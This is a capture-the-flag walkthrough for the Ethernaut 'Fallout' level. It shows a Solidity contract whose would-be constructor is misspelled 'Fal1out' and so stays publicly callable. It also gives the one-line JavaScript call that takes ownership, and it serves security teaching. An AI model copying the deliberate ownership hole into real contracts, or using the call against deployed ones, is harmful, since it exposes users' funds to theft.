---
description: constructor in older versions of Solidity
---

# 2 - Fallout

Ethernaut Level2: [Fallout](https://ethernaut.openzeppelin.com/level/0xD2e5e0102E55a5234379DD796b8c641cd5996Efd)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

### Goal of this level

* Claiming ownership of the contract

## Walkthrough

<details>

<summary>Key to solve this problem 🔑</summary>

Name of the constructor is wierd!\
It's `Fal1out()` not `Fallout()`

</details>

```javascript
await contract.Fal1out();
```

Done! 😎

### Key Takeaway

* You could define the name of the constructor with the **name of the contract** in some **older versions** of Solidity
